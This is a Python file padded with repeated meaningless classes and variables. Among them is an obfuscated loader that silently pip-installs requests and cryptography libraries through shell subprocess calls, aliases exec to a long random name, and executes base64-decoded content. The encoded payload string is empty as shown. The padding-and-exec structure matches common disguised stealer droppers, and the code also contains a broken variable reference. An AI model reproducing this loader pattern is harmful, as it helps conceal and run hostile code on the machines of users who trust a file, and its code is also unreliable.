

from sys import executable, stderr
class nGoH0ghMDO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WxE3BZwh5Q = 12828902
EAGSQwv5ZH = 23419509
RpiNFzqzel = 41156027
class iGIKN6FWuX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oUFLYz9gk5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
gR01LZBNtN = 2581270
ky5tVKWX94 = 64171239
tnCksyW8HH = 71913900
'm7zYsIBIxY'
class PGie1VnP6t:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
P73FcmnKd1 = 25071529
{'username': 'CxjU1Ut', 'age': 24}
class JuR37FgRED:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uZRLcm2PIx:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class m9WjY1QyY4:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
d8ZDmvtagk = 6218941
["'c9qjAeqQHX'", "'QuScMOUMGm'", "'KNEXZvZL6C'", "'i1UEuAftLh'"]
class FAMT0aNd6o:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class z12SYBqmSJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class XUxMHQ95CA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lwmprUHNsB = 24489852
tOcrY2YXby = 86378711
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class nGoH0ghMDO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WxE3BZwh5Q = 12828902
EAGSQwv5ZH = 23419509
RpiNFzqzel = 41156027
class iGIKN6FWuX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oUFLYz9gk5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
gR01LZBNtN = 2581270
ky5tVKWX94 = 64171239
tnCksyW8HH = 71913900
'm7zYsIBIxY'
class PGie1VnP6t:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
P73FcmnKd1 = 25071529
{'username': 'CxjU1Ut', 'age': 24}
class JuR37FgRED:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uZRLcm2PIx:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class m9WjY1QyY4:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
d8ZDmvtagk = 6218941
["'c9qjAeqQHX'", "'QuScMOUMGm'", "'KNEXZvZL6C'", "'i1UEuAftLh'"]
class FAMT0aNd6o:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class z12SYBqmSJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class XUxMHQ95CA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lwmprUHNsB = 24489852
tOcrY2YXby = 86378711
TobYi3YxATerpyESYDItggMxuulLWbcWOCGwyt = exec
class nGoH0ghMDO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WxE3BZwh5Q = 12828902
EAGSQwv5ZH = 23419509
RpiNFzqzel = 41156027
class iGIKN6FWuX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oUFLYz9gk5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
gR01LZBNtN = 2581270
ky5tVKWX94 = 64171239
tnCksyW8HH = 71913900
'm7zYsIBIxY'
class PGie1VnP6t:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
P73FcmnKd1 = 25071529
{'username': 'CxjU1Ut', 'age': 24}
class JuR37FgRED:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uZRLcm2PIx:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class m9WjY1QyY4:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
d8ZDmvtagk = 6218941
["'c9qjAeqQHX'", "'QuScMOUMGm'", "'KNEXZvZL6C'", "'i1UEuAftLh'"]
class FAMT0aNd6o:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class z12SYBqmSJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class XUxMHQ95CA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lwmprUHNsB = 24489852
tOcrY2YXby = 86378711
import concurrent.futures
BrWhgtJYwpLwGMH8EPCNudecL9H8zTHpJJdBWu=""
TobYi3YxATerpyESYDItggMxuulLWbcWOCGwyt(base64.b64decode(BrWhgtJYwpLwGMH8EPCNudecL9H8zTHpJJdBWu))
class nGoH0ghMDO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WxE3BZwh5Q = 12828902
EAGSQwv5ZH = 23419509
RpiNFzqzel = 41156027
class iGIKN6FWuX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class oUFLYz9gk5:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
gR01LZBNtN = 2581270
ky5tVKWX94 = 64171239
tnCksyW8HH = 71913900
'm7zYsIBIxY'
class PGie1VnP6t:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
P73FcmnKd1 = 25071529
{'username': 'CxjU1Ut', 'age': 24}
class JuR37FgRED:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uZRLcm2PIx:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class m9WjY1QyY4:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
d8ZDmvtagk = 6218941
["'c9qjAeqQHX'", "'QuScMOUMGm'", "'KNEXZvZL6C'", "'i1UEuAftLh'"]
class FAMT0aNd6o:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class z12SYBqmSJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class XUxMHQ95CA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
lwmprUHNsB = 24489852
tOcrY2YXby = 86378711